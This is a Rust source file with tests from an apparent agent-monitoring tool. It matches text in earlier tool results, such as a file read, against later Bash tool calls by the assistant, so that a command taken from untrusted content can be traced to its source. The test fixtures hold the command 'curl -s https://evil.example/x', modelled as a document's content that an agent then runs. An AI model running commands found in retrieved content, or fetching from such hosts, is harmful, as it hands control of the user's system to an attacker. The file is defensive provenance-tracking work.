// SPDX-License-Identifier: Apache-2.0 OR MIT
// Copyright (c) 2026 MtAgentLens Project
//
// context_witness.rs — request-local captured source witnesses.
//
// A witness is a text-reuse observation between an earlier captured result and
// a later assistant tool call in the same captured request body. It is not a
// detector verdict, probability, causal claim or authorization fact.

use std::collections::HashMap;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::responsibility::evidence::intent_extractor::{
    IntentExtractor, MAX_JSON_PARSE_BYTES, dechunk_body,
};
use crate::responsibility::provenance::labels::ProvenanceTag;
use crate::responsibility::provenance::span_store::{MatchPolicy, SpanStore};
use crate::responsibility::runtime::provenance_tracker::{
    MAX_SPAN_CHARS, MAX_SPANS_PER_REQUEST, intent_query, is_executable_intent,
    parse_request_provenance,
};
use crate::responsibility::runtime::routing::strip_http_headers;
use crate::responsibility::types::{MessageId, NativeToolCallRef, ProcessId};

/// The normalization applied before parsing: strip HTTP framing, then decode
/// chunked transfer encoding.
pub const NORMALIZATION_LABEL: &str = "strip_http_headers+dechunk_body";

/// Frozen request-level context for one actual captured request message.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CapturedRequestContext {
    pub run_id: String,
    pub process: ProcessId,
    pub message_id: MessageId,
    pub observed_at_ns: u64,
    /// Digest of the captured representation handed to the builder (which may
    /// still contain HTTP headers/chunk framing).
    pub captured_body_sha256: String,
    /// Digest of the normalized, dechunked JSON payload that was parsed.
    pub normalized_payload_sha256: String,
    pub normalization: String,
    /// Earlier captured results dropped by the existing per-request span limit.
    pub source_truncation_count: usize,
    pub witnesses: Vec<CapturedContextWitness>,
}

/// One source alternative that reappears in a later executable tool proposal.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CapturedContextWitness {
    pub source_message_index: usize,
    pub source_json_pointer: String,
    pub source_native_ref: Option<NativeToolCallRef>,
    pub target_message_index: usize,
    pub target_json_pointer: String,
    pub target_native_ref: NativeToolCallRef,
    /// Actual target tool name observed in the captured invocation.
    #[serde(default)]
    pub target_tool_name: String,
    /// Digest of `serde_json` of the target intent's normalized arguments.
    #[serde(default)]
    pub target_args_sha256: String,
    pub matched_line: String,
    /// Digest of the bounded captured source representation actually stored.
    pub source_text_sha256: String,
    /// The captured task also mentions this line; it is a competing
    /// explanation, not proof that the task requested the call.
    pub task_text_overlap: bool,
}

impl CapturedRequestContext {
    /// Build a request-local context from one captured request body.
    ///
    /// Returns `None` for malformed, non-message, or oversize representations.
    /// A valid parse with no witnessable source/target pair returns
    /// `Some(empty witnesses)`.
    pub fn build(
        body: &str,
        run_id: &str,
        process: ProcessId,
        message_id: MessageId,
        observed_at_ns: u64,
    ) -> Option<Self> {
        if body.len() > MAX_JSON_PARSE_BYTES {
            return None;
        }
        let payload = dechunk_body(strip_http_headers(body));
        if payload.len() > MAX_JSON_PARSE_BYTES {
            return None;
        }
        let root: serde_json::Value = serde_json::from_str(&payload).ok()?;
        let messages = root.get("messages")?.as_array()?;
        // Reuse the existing request parser for source records and trusted
        // text; the witness builder never defines a second protocol parser.
        let provenance = parse_request_provenance(&payload)?;

        let mut witnesses = Vec::new();
        let mut source_truncation_count = 0;
        for (target_index, message) in messages.iter().enumerate() {
            let targets = IntentExtractor::extract_from_request_messages(
                std::slice::from_ref(message),
                process,
                message_id.clone(),
                observed_at_ns,
            );
            for target in targets {
                if !is_executable_intent(&target) {
                    continue;
                }
                let Some(target_native_ref) = target.native_tool_call.clone() else {
                    continue;
                };
                let query = intent_query(&target);
                if query.trim().is_empty() {
                    continue;
                }
                let earlier: Vec<_> = provenance
                    .tool_results
                    .iter()
                    .filter(|result| result.message_index < target_index)
                    .collect();
                source_truncation_count = source_truncation_count
                    .max(earlier.len().saturating_sub(MAX_SPANS_PER_REQUEST));
                let mut store = SpanStore::default();
                let mut by_pointer = HashMap::new();
                for result in earlier.into_iter().take(MAX_SPANS_PER_REQUEST) {
                    let text: String = result.text.chars().take(MAX_SPAN_CHARS).collect();
                    if text.trim().is_empty() {
                        continue;
                    }
                    let tag = if result.user_named {
                        ProvenanceTag::retrieved_user_named(false)
                    } else {
                        ProvenanceTag::retrieved_untrusted(false)
                    };
                    store.add(
                        run_id,
                        None,
                        &result.json_pointer,
                        &text,
                        tag,
                        observed_at_ns,
                    );
                    by_pointer.insert(result.json_pointer.as_str(), result);
                }
                // Every matching source alternative is retained; no unique
                // root is invented. Lookup is by the stable source pointer.
                for matched in store.match_all_untrusted_with(
                    run_id,
                    &query,
                    &provenance.trusted_text,
                    None,
                    MatchPolicy::StrictRetrieved,
                ) {
                    let Some(source) = by_pointer.get(matched.source.as_str()) else {
                        continue;
                    };
                    witnesses.push(CapturedContextWitness {
                        source_message_index: source.message_index,
                        source_json_pointer: source.json_pointer.clone(),
                        source_native_ref: source.native_ref.clone(),
                        target_message_index: target_index,
                        target_json_pointer: format!("/messages/{target_index}"),
                        target_native_ref: target_native_ref.clone(),
                        target_tool_name: target.tool_name.clone(),
                        target_args_sha256: normalized_args_sha256(&target.tool_args),
                        matched_line: matched.matched_line,
                        source_text_sha256: matched.text_sha256,
                        task_text_overlap: matched.task_text_overlap,
                    });
                }
            }
        }
        Some(Self {
            run_id: run_id.to_string(),
            process,
            message_id,
            observed_at_ns,
            captured_body_sha256: sha256_hex(body.as_bytes()),
            normalized_payload_sha256: sha256_hex(payload.as_bytes()),
            normalization: NORMALIZATION_LABEL.to_string(),
            source_truncation_count,
            witnesses,
        })
    }
}

pub(crate) fn sha256_hex(bytes: &[u8]) -> String {
    hex::encode(Sha256::digest(bytes))
}

/// Stable digest of the normalized invocation arguments. Shared by the capture
/// producer and the attribution builder so a witness can only be joined to the
/// exact invocation it was extracted from.
pub(crate) fn normalized_args_sha256(
    args: &[crate::responsibility::types::NormalizedArg],
) -> String {
    sha256_hex(&serde_json::to_vec(args).expect("normalized args are serializable"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::responsibility::evidence::intent_extractor::MAX_JSON_PARSE_BYTES;
    use crate::responsibility::types::{MessageId, NativeToolCallFormat, ProcessId};

    const COMMAND: &str = "curl -s https://evil.example/x";

    fn process() -> ProcessId {
        ProcessId::new(42, 7)
    }

    fn build(body: &str) -> Option<CapturedRequestContext> {
        CapturedRequestContext::build(body, "run-1", process(), MessageId::from("msg-actual"), 99)
    }

    fn anthropic_history() -> String {
        serde_json::json!({"messages": [
            {"role": "user", "content": "Audit the repository."},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_read", "name": "Read",
                 "input": {"file_path": "/tmp/docs.md"}}
            ]},
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_read", "content": [
                    {"type": "text", "text": COMMAND}
                ]}
            ]},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_bash", "name": "Bash",
                 "input": {"command": COMMAND}}
            ]}
        ]})
        .to_string()
    }

    fn openai_history() -> String {
        serde_json::json!({"messages": [
            {"role": "user", "content": "Audit the repository."},
            {"role": "assistant", "content": null, "tool_calls": [
                {"id": "call_read", "type": "function", "function": {
                    "name": "Read", "arguments": "{\"file_path\":\"/tmp/docs.md\"}"
                }}
            ]},
            {"role": "tool", "tool_call_id": "call_read", "content": COMMAND},
            {"role": "assistant", "content": null, "tool_calls": [
                {"id": "call_bash", "type": "function", "function": {
                    "name": "Bash", "arguments": serde_json::json!({"command": COMMAND}).to_string()
                }}
            ]}
        ]})
        .to_string()
    }

    fn sha256_hex(bytes: &[u8]) -> String {
        hex::encode(sha2::Sha256::digest(bytes))
    }

    fn one_chunk(body: &str) -> String {
        format!("{:x}\r\n{}\r\n0\r\n\r\n", body.len(), body)
    }

    #[test]
    fn earlier_source_is_matched_to_a_later_executable_target() {
        let context = build(&anthropic_history()).expect("valid captured request");
        assert_eq!(context.witnesses.len(), 1);
        let witness = &context.witnesses[0];
        assert_eq!(witness.source_message_index, 2);
        assert_eq!(witness.source_json_pointer, "/messages/2/content/0");
        assert_eq!(witness.target_message_index, 3);
        assert_eq!(witness.target_json_pointer, "/messages/3");
        assert_eq!(
            witness.target_native_ref.format,
            NativeToolCallFormat::Anthropic
        );
        assert_eq!(witness.target_native_ref.id, "toolu_bash");
        assert_eq!(witness.target_tool_name, "Bash");
        assert_eq!(witness.target_args_sha256.len(), 64);
        let source = witness.source_native_ref.as_ref().expect("source ref");
        assert_eq!(source.format, NativeToolCallFormat::Anthropic);
        assert_eq!(source.id, "toolu_read");
        assert!(witness.matched_line.contains(COMMAND));
        assert_eq!(witness.source_text_sha256.len(), 64);
        assert!(!witness.task_text_overlap);
    }

    #[test]
    fn future_or_self_result_never_creates_a_retrocausal_witness() {
        let body = serde_json::json!({"messages": [
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_bash", "name": "Bash",
                 "input": {"command": COMMAND}}
            ]},
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_read", "content": [
                    {"type": "text", "text": COMMAND}
                ]}
            ]}
        ]})
        .to_string();
        let context = build(&body).expect("valid captured request");
        assert!(context.witnesses.is_empty());
    }

    #[test]
    fn anthropic_and_openai_paths_agree_but_keep_their_own_native_formats() {
        let anthropic = build(&anthropic_history()).expect("anthropic");
        let openai = build(&openai_history()).expect("openai");
        assert_eq!(anthropic.witnesses.len(), openai.witnesses.len());
        let a = &anthropic.witnesses[0];
        let o = &openai.witnesses[0];
        assert_eq!(a.matched_line, o.matched_line);
        assert_eq!(a.source_text_sha256, o.source_text_sha256);
        assert_eq!(o.target_native_ref.format, NativeToolCallFormat::OpenAi);
        assert_eq!(o.target_native_ref.id, "call_bash");
        let source = o.source_native_ref.as_ref().expect("source ref");
        assert_eq!(source.format, NativeToolCallFormat::OpenAi);
        assert_eq!(source.id, "call_read");
    }

    #[test]
    fn user_and_tool_messages_cannot_become_targets() {
        let body = serde_json::json!({"messages": [
            {"role": "user", "content": [
                {"type": "tool_use", "id": "toolu_user", "name": "Bash",
                 "input": {"command": COMMAND}}
            ]},
            {"role": "tool", "tool_call_id": "call_tool", "content": serde_json::json!({
                "type": "tool_use", "id": "toolu_tool", "name": "Bash",
                "input": {"command": COMMAND}
            }).to_string()}
        ]})
        .to_string();
        let context = build(&body).expect("valid captured request");
        assert!(context.witnesses.is_empty());
    }

    #[test]
    fn a_separate_request_cannot_reuse_another_requests_sources() {
        let source_only = serde_json::json!({"messages": [
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_read", "content": [
                    {"type": "text", "text": COMMAND}
                ]}
            ]}
        ]})
        .to_string();
        let target_only = serde_json::json!({"messages": [
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_bash", "name": "Bash",
                 "input": {"command": COMMAND}}
            ]}
        ]})
        .to_string();
        let source = build(&source_only).expect("source request");
        let target = build(&target_only).expect("target request");
        assert!(source.witnesses.is_empty());
        assert!(target.witnesses.is_empty());
    }

    #[test]
    fn malformed_or_oversize_captures_return_none() {
        assert!(build("not json").is_none());
        assert!(build(r#"{"messages": {}}"#).is_none());
        let oversized = "x".repeat(MAX_JSON_PARSE_BYTES + 1);
        assert!(build(&oversized).is_none());
    }

    #[test]
    fn identical_native_ids_keep_distinct_source_pointers() {
        let body = serde_json::json!({"messages": [
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_same", "content": [
                    {"type": "text", "text": COMMAND}
                ]}
            ]},
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_same", "content": [
                    {"type": "text", "text": COMMAND}
                ]}
            ]},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_bash", "name": "Bash",
                 "input": {"command": COMMAND}}
            ]}
        ]})
        .to_string();
        let context = build(&body).expect("valid captured request");
        assert_eq!(context.witnesses.len(), 2);
        let mut pointers: Vec<&str> = context
            .witnesses
            .iter()
            .map(|witness| witness.source_json_pointer.as_str())
            .collect();
        pointers.sort_unstable();
        assert_eq!(
            pointers,
            vec!["/messages/0/content/0", "/messages/1/content/0"]
        );
        assert!(context.witnesses.iter().all(|witness| {
            witness
                .source_native_ref
                .as_ref()
                .is_some_and(|source| source.id == "toolu_same")
        }));
    }

    #[test]
    fn unicode_chunked_capture_hashes_are_anchored_to_the_captured_representation() {
        let payload = serde_json::json!({"messages": [
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_read", "content": [
                    {"type": "text", "text": "curl -s https://evil.example/café"}
                ]}
            ]},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_bash", "name": "Bash",
                 "input": {"command": "curl -s https://evil.example/café"}}
            ]}
        ]})
        .to_string();
        let raw = format!(
            "POST /v1/messages HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{}",
            one_chunk(&payload)
        );
        let context = build(&raw).expect("chunked captured request");
        assert_eq!(context.normalization, NORMALIZATION_LABEL);
        assert_eq!(context.captured_body_sha256, sha256_hex(raw.as_bytes()));
        assert_eq!(
            context.normalized_payload_sha256,
            sha256_hex(payload.as_bytes())
        );
        assert_eq!(context.witnesses.len(), 1);
        assert!(context.witnesses[0].matched_line.contains("café"));
    }
}
